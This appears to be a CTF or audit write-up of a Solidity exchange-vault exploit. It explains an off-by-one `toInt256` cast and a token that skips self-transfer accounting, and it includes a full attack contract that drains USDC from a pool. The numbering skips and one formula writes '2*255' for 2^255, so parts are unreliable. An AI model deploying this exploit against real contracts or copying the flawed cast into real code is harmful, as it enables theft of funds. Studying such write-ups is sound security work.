### Vulnerabilities
1. Incorrect `uint256` to `int256` cast:
```solidity
    function toInt256(uint256 value) internal pure returns (int256 result) {
        assembly {
            let max := shl(255, 1)
            if gt(value, max) { revert(0, 0) }
            result := value
        }
    }
```
`type(int256).max` is `2^255 - 1`, but `toInt256()` allows `2^255` as a valid input. Casting this value produces a large negative `int256`, which is especially dangerous in accounting logic that relies on deltas.

These functions are used directly in delta tracking:
```solidity
    function _supplyCredit(IERC20 token, uint256 credit) internal {
        _accountDelta(token, -SafeCast.toInt256(credit));
    }
    function _takeDebt(IERC20 token, uint256 debt) internal {
        _accountDelta(token, SafeCast.toInt256(debt));
    }
    function _accountDelta(IERC20 token, int256 delta) internal {
        if (delta == 0) return;
        int256 current = _tokenDeltas[token];
        int256 next = current + delta;
        if (current == 0 && next != 0) {
            _nonZeroDeltaCount++;
        } else if (current != 0 && next == 0) {
            _nonZeroDeltaCount--;
        }
        _tokenDeltas[token] = next;
    }
```
Allowing a wrapped negative value here enables manipulation of internal accounting.

3. NISC token skips balance updates on self-transfers:
```solidity
    function _update(address from, address to, uint256 value) internal override {
        if (from == to) {
            return;
        }
        super._update(from, to, value);
    }
```
If `from == to`, balances are not updated at all. This allows a contract to "transfer" arbitrary amounts to itself without actually holding those tokens, while still triggering downstream logic.

### Attack

1. Call `exchangeVault.sendTo(nisc, address(exchangeVault), 2^255)`. This instructs the vault to send `2^255` NISC to itself. Because NISC skips accounting on self-transfers, the vault does not need to actually hold this amount. Internally, `_takeDebt` updates `tokenDeltas[NISC]` to `-2^255`.
2. With this massive negative delta, swap an enormous amount of NISC for USDC and drain the pool. About `2^148 NISC` is sufficient.
3. At this point, both USDC and NISC deltas are negative. The attacker can now call `sendTo` again, this time sending funds to their own address and receiving the drained assets.
4. Finally, the attacker zeroes out the NISC delta by calling `sendTo(nisc, address(exchangeVault), diff)`, where `diff`:

    `diff = 2*255 - niscIn * (PCT_DIV + FEE) / PCT_DIV - niscBal`

    `niscIn` - amount used in the USDC swap

    `niscBal` - NISC pool reserve after the attack (fees)

    `PCT_DIV = 10000`

    `FEE = 3`

6. Full attack:
```solidity
    function rektExchange(IExchangeVault exchangeVault, IPool pool) public {
        bytes memory payload = abi.encode(pool);
        exchangeVault.unlock(abi.encodeWithSelector(this.onExchangeCallback.selector, payload));
    }

    function onExchangeCallback(bytes memory data) external {
        (IPool pool) = abi.decode(data, (IPool));    
        IExchangeVault exchangeVault = IExchangeVault(msg.sender);

        uint256 niscIn = 2 ** 148;
        uint256 magic = 2 ** 255;
        exchangeVault.sendTo(nisc, address(exchangeVault), magic);
        uint256 out = exchangeVault.swapInPool(pool, nisc, usdc, niscIn, 0);
        uint256 niscBal = nisc.balanceOf(address(exchangeVault));
        exchangeVault.sendTo(usdc, address(this), out);
        exchangeVault.sendTo(nisc, address(this), niscBal);

        uint256 diff = magic - niscIn * (PCT_DIV + FEE) / PCT_DIV - niscBal;
        exchangeVault.sendTo(nisc, address(exchangeVault), diff);
    }
```
